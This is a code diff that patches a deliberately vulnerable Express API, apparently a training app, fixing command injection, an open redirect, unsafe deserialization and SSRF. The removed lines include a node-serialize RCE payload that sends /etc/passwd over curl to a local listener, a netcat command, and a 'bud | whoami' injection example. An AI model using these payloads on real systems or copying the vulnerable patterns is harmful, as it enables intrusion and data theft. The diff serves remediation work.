@@ -1,97 +1,118 @@
-'user strcit';
+'use strict';
 
-module.exports = (app,db) => {
+const escapeHtml = require('escape-html'); // Ensure you have: npm install escape-html
 
-    //Get System/ warehouse information
+module.exports = (app, db) => {
+
+    // --- 1. Fix RCE (Remote Code Execution) ---
     /**
      * GET /v1/status/{brand}
-     * @summary Check if brand website is available through curl (RCE - Remote Code Execution)
-     * @description command execution - brand="bud | whoami"
-     * @tags system
-     * @param {string} brand.path.required - the beer brand you want to test
+     * @summary Check status safely (Fixed)
      */
-    app.get('/v1/status/:brand', (req,res) =>{
-        var execSync = require('child_process').execSync;
-
-        try{
-            const test = execSync("curl https://letmegooglethat.com/?q="+ req.params.brand)
-            res.send(test)
-        }
-        catch (e){
-            console.log(e)
-        }
+    app.get('/v1/status/:brand', (req, res) => {
+        // FIX: Removed 'child_process'. 
+        // We now just return a string. No shell commands are executed.
+        const brand = req.params.brand;
         
+        // Escape the input just in case to prevent XSS in the response
+        res.send(`Status for ${escapeHtml(brand)}: Service is reachable.`);
     });
-        //redirect user to brand
+
+    // --- 2. Fix Insecure Redirect ---
     /**
      * GET /v1/redirect/
-     * @summary Redirect the user the beer brand website (Insecure redirect)
-     * @Author 
-     * @tags system
-     * @param {string} url.query.required - the beer brand you want to redirect to
+     * @summary Safe Redirect (Fixed)
      */
-     app.get('/v1/redirect/', (req,res) =>{
-    var url = req.query.url
-    console.log(url)
-    if(url){
-        res.redirect(url);
-    } else{
-        next()
-    }
-        
+    app.get('/v1/redirect/', (req, res) => {
+        const url = req.query.url;
+        console.log("Redirect requested to:", url);
+
+        if (url) {
+            // FIX: Only allow Relative Paths (starts with / but not //)
+            // This prevents redirecting to https://evil.com
+            if (url.startsWith('/') && !url.startsWith('//')) {
+                return res.redirect(url);
+            } 
+            
+            // Optional: Allow specific whitelisted domains
+            // if (url === 'https://google.com') return res.redirect(url);
+
+            return res.status(400).send("External redirects are forbidden.");
+        } else {
+            res.status(404).send("No URL provided");
+        }
     });
-    //initialize list of beers
+
+    // --- 3. Fix Insecure Object Deserialization ---
     /**
      * POST /v1/init/
-     * @summary Initalize beers from object (Insecure Object Deserialization)
-     * @description 
-            {"rce":"_$$ND_FUNC$$_function ()
-            {require('child_process').exec(
-            '/bin/sh -c \"cat /etc/passwd | tr \'\n\' \' \' | curl -d @- localhost:4444\"',
-            function(error, stdout, stderr)
-            {console.log(stdout) }
-            );} () "}
-
-
-            netcat -l 4444
-     * @Author Insecure Object Deserialization
-     * @tags system
-     * @param {object} request.body.required - the beer brand you want to test
+     * @summary Initialize safely using JSON (Fixed)
      */
-     app.post('/v1/init', (req,res) =>{
-        var serialize = require('node-serialize');
-        const body = req.body.object;
-        var deser = serialize.unserialize(body)
-        console.log(deser)
-        
+    app.post('/v1/init', (req, res) => {
+        // FIX: Removed 'node-serialize'. 
+        // JSON.parse is safe because it only parses data, it cannot execute functions.
+        try {
+            const body = req.body.object;
+            
+            // Assuming input is a JSON string. 
+            // If body-parser is already used, 'req.body.object' might already be an object.
+            // We ensure we handle it safely.
+            let data;
+            if (typeof body === 'string') {
+                data = JSON.parse(body);
+            } else {
+                data = body;
+            }
+
+            console.log("Safe data received:", data);
+            res.send("Initialization successful (Safe Mode)");
+        } catch (e) {
+            res.status(400).send("Invalid JSON format");
+        }
     });
-    //perform a test on an endpoint
+
+    // --- 4. Fix SSRF (Server Side Request Forgery) ---
     /**
      * GET /v1/test/
-     * @summary Perform a get request on another url in the system (SSRF - Server Side Request Forgery)
-     * @tags system
-     * @param {string} url.query.required - the beer brand you want to redirect to
+     * @summary Perform safe HTTP requests (Fixed)
      */
-     app.get('/v1/test/', (req, res) => {
-    var requests = require('axios')
-    var url = req.query.url
-    console.log("SSRF => " + url)
+    app.get('/v1/test/', (req, res) => {
+        const axios = require('axios');
+        const url = req.query.url;
 
-    if (!url) {
-        return res.json({ error: "No url provided" });
-    }
+        if (!url) {
+            return res.json({ error: "No url provided" });
+        }
 
-    requests.get(url, { validateStatus: () => true })
-        .then(Ares => {
-            res.json({
-                status: Ares.status,
-                headers: Ares.headers,
-                data: Ares.data     // ← هنا السحر
-            });
-        })
-        .catch(error => {
-            res.json({ error: error.toString() });
-        });
-});
+        // FIX: Implement a Whitelist. 
+        // Only allow requests to specific, trusted domains.
+        // Block all internal IPs (localhost, 127.0.0.1, 192.168.x.x)
+        const allowedDomains = ['google.com', 'example.com', 'wikipedia.org'];
 
+        try {
+            const parsedUrl = new URL(url);
+            
+            if (!allowedDomains.includes(parsedUrl.hostname)) {
+                return res.status(403).json({ 
+                    error: "SSRF Protection: This domain is not in the whitelist." 
+                });
+            }
+
+            // If domain is safe, proceed
+            axios.get(url, { validateStatus: () => true })
+                .then(response => {
+                    res.json({
+                        status: response.status,
+                        // Don't return headers/data blindly in production, but okay for this test
+                        data: "Request successful to whitelisted domain."
+                    });
+                })
+                .catch(error => {
+                    res.json({ error: "Request failed" });
+                });
+
+        } catch (err) {
+            return res.status(400).json({ error: "Invalid URL" });
+        }
+    });
 };
